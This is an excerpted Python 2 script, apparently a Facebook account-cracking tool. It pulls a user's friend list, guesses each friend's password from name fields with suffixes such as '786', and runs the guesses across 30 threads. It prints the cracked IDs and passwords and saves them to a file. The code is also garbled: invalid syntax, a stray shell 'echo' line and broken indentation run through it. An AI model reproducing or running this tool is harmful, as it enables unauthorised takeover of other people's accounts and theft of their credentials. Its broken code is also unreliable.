...
def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\x1b[1;95mPlease Wait \x1b[1;95m"+o),;sys.stdout.flush();time.sleep(5)
...
while (loop == 'true'):
    ...
    if (username == CorrectUsername ok):
    	password = raw_input("\033[1;91m🗝 \x1b[1;95mPassword? \x1b[1;91m»» \x1b[1;91m")
        if (password == CorrectPassword ok):
            print "you are Logged in successfully as " + username #Dev:love_hacker
	    time.sleep(3)
            loop = 'false'
        else:
...
def login():
	...
	try:
		...
		if 'checkpoint' in url:
			...
			print("\n\033[1;96m[!] \x1b[1;91mPassword/Email wrong❌ AO¡")
			os.system('rm -rf login.txt')
			time.sleep(1)
			login()
...
def menu():
	...
	try:
		...
		os.system('clear')
		print"\x1b[1;91m[!] Token invalid oo silly"
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	try:
...
def super():
	...
	os.system('clear')
	print logo
	print "     \033[1;97m-•◈•-\033[1;91m> \033[1;91m1.\x1b[1;95m>_<Clone Friend List.mo"
	print "     \033[1;97m-•◈•-\033[1;91m> \033[1;91m2.\x1b[1;95m>_<Hack Public Accounts mo."
	print "     \033[1;97m-•◈•-\033[1;91m> \033[1;91m0.\033[1;91m>_<Back mo"
	pilih_super()
...
def pilih_super():
	...
	if peak =="":
		...
		print "\033[1;92m•◈•══════••◈•\033[191mB334moking1;95m•◈•══════••◈•"
		try:
	...
	print "\033[1;36;40m[✺] Total frind IDs : \033[1;94m"+str(len(id))
	...
	jalan('           \033[1;91mmoking start cloning Wait...')
	print  "  \033[1;92m ●══════════════════◄►══════════════════●" 
										                           ...
										                           pass8 = b['last_name'] + '786'											
										                                   ...
										                                   x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
										                                       ...
										                                       if 'access_token' in q:		
		                                                                                                               x = requests.get("https://graph.facebook.com/"+user+"?access_token="+q['access_token'])
				                                                                                               z = json.loads(x.text)
											                                       print '\x1b[1;94m[  ✓  ] \x1b[1;92mHack ok 100%💉'			
											                                       print '\x1b[1;94m[•⚔•] \x1b[1;91mName \x1b[1;91m    ✯ \x1b[1;92m' + b['name']			
											                                       print '\x1b[1;94m[•⚔•] \x1b[1;91mID \x1b[1;91m      ✯ \x1b[1;92m' + user	
											                                       ...
											                                       oks.append(user+pass9)
			                                                                                                       ...
			                                                                                                       if 'www.facebook.com' in q["error_msg"]:
				                                                                                                   print '\x1b[1;94m[ mehrad ] \x1b[1;94mCheckpoint'
				                                                                                                   print '\x1b[1;94m[•⚔•] \x1b[1;94mName \x1b[1;94m    ✯ \x1b[1;95m' + b['name']
				                                                                                                   print '\x1b[1;94m[•⚔•] \x1b[1;94mID \x1b[1;94m      ✯ \x1b[1;95m' + user
				                                                                                                   print '\x1b[1;94m[loy] \x1b[1;94mPassword \x1b[1;94m✯ \x1b[1;95m' + pass9 + '\n'
				                                                                                                   cek = open("out/super_cp.txt", "a")
				                                                                                                   cek.write("ID is fekret ast:" +user+ " Pw:" +pass9+"\n")
				                                                                                                   cek.close()
	...
	p = ThreadPool(30)
	p.map(main, id)
	print "\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•\033[1;91mcoll mo\033[1;95m•◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•"
	print "  \033[1;91m«---•◈•---Developed By Rana Aahil--•◈•---»" #Dev:Rana
	echo "procec Completed press control z to go back"
	print"\033[1;91mTotal MaiShAt OK/\x1b[1;95mCP \033[1;93m: \033[1;91m"+str(len(oks))+"\033[1;93m/\033[1;96m"+str(len(cekpoint))
	print """
...
\::/    / ~~~~~/:::/    / \:::\    \   /:::/    / 
 \/____/      /:::/    /   \:::\    \ /:::/    /  
        ...
        \::/    /                 ~~              
         \/____/                  
              ID Open After 7 Days
•\033[1;95m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬•◈•.
: \033[1;91m ....moking MaiShAt....... \033[1;95m :
•\033[1;95m◈•▬ ▬ ▬ ▬ ▬ ▬ ▬ ▬t◈▬▬ ▬ ▬ ▬ ▬•◈•.' 
                Facebook
              \033[1;91m Aahil"""
